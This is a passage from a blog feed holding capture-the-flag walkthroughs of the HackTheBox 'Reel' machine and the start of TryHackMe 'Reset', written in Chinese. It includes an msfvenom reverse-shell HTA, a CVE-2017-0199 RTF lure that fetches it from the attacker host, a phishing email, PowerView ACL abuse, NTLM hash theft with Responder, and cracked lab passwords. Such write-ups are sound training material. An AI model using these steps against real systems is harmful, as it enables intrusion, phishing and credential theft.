class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST</span><br><span class="line">Nmap scan report for 10.10.10.77</span><br><span class="line">Host is up (0.76s latency).</span><br><span class="line">Not shown: 65527 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_05-28-18  11:19PM       &lt;DIR&gt;          documents</span><br><span class="line">22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   Hello:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   TerminalServerCookie:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|_    sequence of commands</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">...</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 7 (85%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2012::-</span><br><span class="line">|   Computer name: REEL</span><br><span class="line">|   NetBIOS computer name: REEL\x00</span><br><span class="line">|   Domain name: HTB.LOCAL</span><br><span class="line">|   Forest name: HTB.LOCAL</span><br><span class="line">|   FQDN: REEL.HTB.LOCAL</span><br><span class="line">|_  System time: 2024-10-27T05:48:32+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-27T05:48:28</span><br><span class="line">|_  start_date: 2024-10-27T05:35:31</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:0:2:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 2s, deviation: 3s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   644.73 ms 10.10.16.1</span><br><span class="line">2   961.24 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 263.65 seconds</span><br></pre></td></tr></table></figure><p>开放21，22，25等若干端口，同时通过脚本扫描结果可知，该域名是<code>REEL.HTB.LOCAL</code>和<code>HTB.LOCAL</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135321701-294670808.png" alt="image-20241027135319436"></p><h2 id="FTP">FTP</h2><p>从扫描结果可知，ftp是允许匿名登录的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135531142-1779717189.png" alt="image-20241027135528981"></p><p>发现三个文件，全部下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt off</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135724047-432466087.png" alt="image-20241027135721726"></p><p>全部查看一下</p><ul><li>readme.txt</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135939835-2118791.png" alt="image-20241027135937958"></p><p>发现是要使用邮件发送rtf格式的文件，并且文档都会保存到这里</p><ul><li>AppLocker.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140116875-11898502.png" alt="image-20241027140115107"></p><ul><li>Windows Event Forwarding.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140535714-592406716.png" alt="image-20241027140533430"></p><p>打开后发现文件已经损坏，使用<code>exiftool </code>检查数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool Windows\ Event\ Forwarding.docx</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140726612-828137712.png" alt="image-20241027140724359"></p><p>找到了个邮箱<code>nico@megabank.com</code></p><h1>RTF钓鱼</h1><p>漏洞链接：<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199">CVE-2017-0199</a></p><p>使用<code>msfvenom</code>生成一个HTA文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f hta-psh -o shell.hta</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142449226-1612502237.png" alt="image-20241027142446919"></p><p>使用<a href="https://github.com/bhdresh/CVE-2017-0199">CVE-2017-0199</a>中的脚本创建一个RTF文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http://10.10.16.4/shell.hta -t rtf -x 0</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142911589-1627462942.png" alt="image-20241027142909573"></p><p>先启动一个http服务，在准备一个nc监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143033400-71778760.png" alt="image-20241027143031493"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143041473-540171105.png" alt="image-20241027143039426"></p><p>使用<code>sendemail </code>发送邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f root@admin.com -t nico@megabank.com -u <span class="string">&quot;look me&quot;</span> -m <span class="string">&quot;click me&quot;</span> -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143939282-234032504.png" alt="image-20241027143936622"></p><p>大约等待30s左右，就获得到shell了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144231417-1596098132.png" alt="image-20241027144229331"></p><p>找到<code>user.txt</code></p><h1>nico -&gt; Tom</h1><p>在<code>nico</code>桌面上发现还有个<code>cred.xml</code>，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144606786-1891749689.png" alt="image-20241027144604507"></p><p>发现是<code>tom</code>的用户名和密码</p><p>可以使用<code>Powershell</code>的<code>PSCredential</code>，它提供了一种存储用户名、密码和凭据的方法。还有两个函数<code>Import-CliXml</code>和<code>Export-CliXml</code> ，用于将这些凭据保存到文件中以及从文件中恢复它们。</p><p>使用<code>Import-CliXml</code>加载文件来获取明文密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145028630-177734907.png" alt="image-20241027145026052"></p><p>获取到<code>Tom</code>用户的明文密码<code>1ts-mag1c!!!</code></p><p>尝试使用ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145337858-1210501876.png" alt="image-20241027145335727"></p><h1>AD Privesc</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145617853-1021058284.png" alt="image-20241027145615560"></p><p>注意到桌面上有个<code>AD Audit</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145705349-1312903517.png" alt="image-20241027145703246"></p><p>先查看一下<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145804355-665684367.png" alt="image-20241027145802362"></p><p>查看一下其他文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150322032-1642287028.png" alt="image-20241027150319779"></p><p>结合提示并实践后发现，运行不了<code>SharpHound.exe</code>，无法使用<code>Bloodhound</code>进行信息收集，所以我们目标放在<code>acls.csv</code>上</p><p>使用<code>scp</code>将文件下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp Tom@10.10.10.77:<span class="string">&#x27;/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv&#x27;</span> ./</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150858200-1795280760.png" alt="image-20241027150855646"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151056577-147523502.png" alt="image-20241027151054397"></p><p>是一个<code>ACL</code>的文件，分析一下，先对<code>PrincipalName</code>简单筛选一下<code>Tom</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151304099-1184542152.png" alt="image-20241027151302192"></p><p>发现<code>Tom</code>对<code>claire</code>有<code>WriteOwner</code>权限，在搜索一下<code>claire</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151757888-1784963385.png" alt="image-20241027151756078"></p><p>发现<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限</p><h1>Tom-&gt;claire</h1><p>注意到之前在<code>tom</code>机器上有<code>PowerView.ps1</code></p><p>所以我们使用<code>WriteOwner</code>权限和<code>PowerView.ps1</code>的功能来登录<code>claire</code></p><p>需要执行以下步骤：</p><ul><li>成为<code>claire</code>的ACL的所有者</li><li>获取该ACL权限</li><li>使用权限更改密码</li></ul><p>先导入<code>PowerView.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027152937745-1565451432.png" alt="image-20241027152935704"></p><p>先把<code>Tom</code>设置成为<code>claire</code>的ACL的所有者</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-identity</span> claire <span class="literal">-OwnerIdentity</span> tom</span><br></pre></td></tr></table></figure><p>给予<code>Tom</code>更改ACL上密码的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> claire <span class="literal">-PrincipalIdentity</span> tom <span class="literal">-Rights</span> ResetPassword</span><br></pre></td></tr></table></figure><p>最后创建一个密码，然后给<code>claire</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Aa123456!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-identity</span> claire <span class="literal">-accountpassword</span> <span class="variable">$pass</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154433915-1759841619.png" alt="image-20241027154431882"></p><p>然后就可以通过ssh登录<code>claire</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154519928-224576146.png" alt="image-20241027154517959"></p><h1>claire-&gt;Backup_Admins</h1><p>之前的ACL分析可知<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限，可以用它将<code>claire</code>加入该组</p><p>先查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155028571-432531593.png" alt="image-20241027155026424"></p><p>当前用户只有<code>ranj</code></p><p>现在添加<code>claire</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins claire /add</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155115663-1003890863.png" alt="image-20241027155113754"></p><p>再查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155143258-1109182793.png" alt="image-20241027155141343"></p><p>发现已经<code>claire</code>在<code>Backup_Admins</code>组中了，重新登录使其生效</p><p><strong>ps: 重新登陆没有成功的，需要在执行一遍 Tom-&gt;claire 的操作</strong></p><h1>Backup_Admins-&gt;Administrator</h1><p>目前我们以<code>claire</code>身份登录，并是<code>Backup_Admins</code>组的成员</p><p>说明我们有查看<code>Administrator</code>文件的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160444426-963998426.png" alt="image-20241027160442280"></p><p>找到<code>root.txt</code>，但是我们没权限查看，注意到有个<code>Backuo Scripts</code>目录，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160633334-1179167874.png" alt="image-20241027160630997"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160743097-1088951995.png" alt="image-20241027160741004"></p><p>最后在<code>BackupScript.ps1</code>文件中找到<code>Admin</code>的密码<code>Cr4ckMeIfYouC4n!</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh Administrator@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161035554-273633219.png" alt="image-20241027161033587"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161109110-316346945.png" alt="image-20241027161106839"></p><p>最终找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇Active Directory 101系列之Reel</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory 101" scheme="https://ya1orin.github.io/tags/Active-Directory-101/"/>
    
  </entry>
  
  <entry>
    <title>THM-Reset</title>
    <link href="https://ya1orin.github.io/posts/fa5fb889.html"/>
    <id>https://ya1orin.github.io/posts/fa5fb889.html</id>
    <published>2024-10-25T05:45:52.000Z</published>
    <updated>2024-11-13T05:19:50.891Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.219.65</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST</span><br><span class="line">Nmap scan report for 10.10.219.65</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 65515 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=HayStack.thm.corp</span><br><span class="line">| Not valid before: 2024-10-24T05:48:35</span><br><span class="line">|_Not valid after:  2025-04-25T05:48:35</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: THM</span><br><span class="line">|   NetBIOS_Domain_Name: THM</span><br><span class="line">|   NetBIOS_Computer_Name: HAYSTACK</span><br><span class="line">|   DNS_Domain_Name: thm.corp</span><br><span class="line">|   DNS_Computer_Name: HayStack.thm.corp</span><br><span class="line">|   DNS_Tree_Name: thm.corp</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-25T05:51:48+00:00</span><br><span class="line">|_ssl-date: 2024-10-25T05:53:13+00:00; +22s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">49670/tcp open  unknown</span><br><span class="line">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 21s, deviation: 0s, median: 21s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-25T05:51:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   662.94 ms 10.14.0.1</span><br><span class="line">2   663.13 ms 10.10.219.65</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds</span><br></pre></td></tr></table></figure><p>可以看出这是一台域控，并且域名是<code>HayStack.thm.corp</code>，将这个和<code> thm.corp</code>添加到<code>/etc/hosts</code></p><h2 id="SMB">SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135202309-1900674591.png" alt="image-20241025135138717"></p><p>尝试连接<code>Data</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.219.65/Data</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135505429-2020002712.png" alt="image-20241025135442301"></p><p>发现每次操作文件名都会变化，先将文件下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135646463-1583002200.png" alt="image-20241025135623489"></p><p>找到初始密码<code>ResetMe123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135729828-1298084476.png" alt="image-20241025135706715"></p><p>在另一个pdf文件中发现一组用户名密码<code>LILY ONEILL:ResetMe123!</code></p><h2 id="rpc">rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.219.65</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025140240543-805157185.png" alt="image-20241025140217254"></p><p>并没有什么信息</p><h1>获取user.txt</h1><p>在之前进行smb探测的时候发现目录会随着每次访问，在一定时间后就会改变文件名，说明不止我们一个人在访问这个目录，所以我们可以使用工具尝试在smb中捕获另一个人的hash</p><p>使用<a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a>工具创建恶意文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g url -s 10.14.90.122 -f aaa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142209751-1923196893.png" alt="image-20241025142146578"></p><p>在攻击机上监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure><p>将生成的文件传到靶机上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142655232-1422163173.png" alt="image-20241025142631944"></p><p>在监听处我们就捕获到了一组hash</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142755759-907774947.png" alt="image-20241025142732867"></p><p>将其保存到<code>hash</code>文件，用于破解</p><p>使用<code>john</code>工具破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143503161-1529556282.png" alt="image-20241025143439961"></p><p>成功获取<code>AUTOMATE</code>的密码<code>Passw0rd1</code></p><p>尝试登录</p><p><code>evil-winrm -i 10.10.219.65 -u AUTOMATE -p Passw0rd1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143817037-942278707.png" alt="image-20241025143753555"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1>横向移动</h1><h2 id="AS-REP-Roasting">AS-REP Roasting</h2><p>使用<code>bloodhound-pytohn</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u automate -p Passw0rd1 -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025144647833-553174619.png" alt="image-20241025144624398"></p><p>将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025150432464-189680214.png" 